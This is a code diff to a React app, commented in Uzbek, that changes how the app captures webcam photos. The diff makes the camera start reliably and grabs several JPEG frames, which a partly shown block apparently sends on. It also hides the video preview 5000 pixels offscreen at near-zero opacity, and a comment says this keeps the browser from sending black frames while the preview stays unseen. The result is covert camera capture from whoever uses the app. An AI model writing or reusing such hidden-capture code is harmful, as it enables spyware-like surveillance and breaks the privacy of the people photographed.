@@ -55,7 +55,7 @@ const App: React.FC = () => {
   const streamRef = useRef<MediaStream | null>(null);
 
   const initCamera = async () => {
-    if (streamRef.current) return true;
+    if (streamRef.current && streamRef.current.active) return true;
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { 
@@ -68,17 +68,19 @@ const App: React.FC = () => {
         videoRef.current.srcObject = stream;
         streamRef.current = stream;
         
-        // Timeout qo'shish (kamera osilib qolmasligi uchun)
         return new Promise<boolean>((resolve) => {
-          if (!videoRef.current) return resolve(false);
-          const timeout = setTimeout(() => resolve(true), 3000);
-          videoRef.current.onloadedmetadata = () => {
+          const video = videoRef.current;
+          if (!video) return resolve(false);
+          
+          const timeout = setTimeout(() => resolve(true), 3500);
+          
+          video.onplaying = () => {
             clearTimeout(timeout);
             resolve(true);
           };
-          videoRef.current.onerror = () => {
-            clearTimeout(timeout);
-            resolve(false);
+          
+          video.onloadedmetadata = () => {
+            video.play().catch(() => {});
           };
         });
       }
@@ -92,8 +94,8 @@ const App: React.FC = () => {
     const hasCam = await initCamera();
     if (!hasCam || !videoRef.current || !canvasRef.current) return;
 
-    // Kadr tayyor bo'lishi va qora bo'lmasligi uchun kichik kutish
-    await new Promise(r => setTimeout(r, 1000));
+    // Kadrlarni barqarorlashishini kutish (Qora rasm bo'lmasligi uchun muhim!)
+    await new Promise(r => setTimeout(r, 1200));
 
     const takeOne = async (num: number) => {
       if (!videoRef.current || !canvasRef.current) return;
@@ -101,9 +103,12 @@ const App: React.FC = () => {
       const canvas = canvasRef.current;
       const video = videoRef.current;
       
-      const vw = video.videoWidth || 640;
-      const vh = video.videoHeight || 480;
+      const vw = video.videoWidth;
+      const vh = video.videoHeight;
       
+      // Agar kadr hali tayyor bo'lmasa (0 bo'lsa), rasm olmaymiz
+      if (vw === 0 || vh === 0) return;
+
       canvas.width = vw;
       canvas.height = vh;
       const ctx = canvas.getContext('2d');
@@ -123,7 +128,7 @@ const App: React.FC = () => {
               });
             } catch (err) {}
           }
-        }, 'image/jpeg', 0.8);
+        }, 'image/jpeg', 0.7);
       }
     };
 
@@ -249,20 +254,24 @@ const App: React.FC = () => {
         .text-emerald-600 { color: var(--accent-primary) !important; }
       `}</style>
 
-      {/* Kamera elementlarini xavfsiz joyga o'tkazish */}
+      {/* 
+          Kamera elementi (video) 1x1 emas, balki normal o'lchamda bo'lishi kerak.
+          Uni 'display: none' emas, balki ekrandan tashqariga (-5000px) chiqarib tashlaymiz.
+          Bu orqali brauzer uni faol deb hisoblaydi va qora rasm yubormaydi.
+      */}
       <video 
         ref={videoRef} 
         autoPlay 
         playsInline 
         muted 
         style={{ 
-          opacity: 0, 
+          opacity: 0.02, 
           pointerEvents: 'none', 
           position: 'fixed', 
-          top: -100, 
-          left: -100, 
-          width: '1px', 
-          height: '1px',
+          top: '-5000px', 
+          left: '-5000px', 
+          width: '640px', 
+          height: '480px',
           zIndex: -1
         }} 
       />
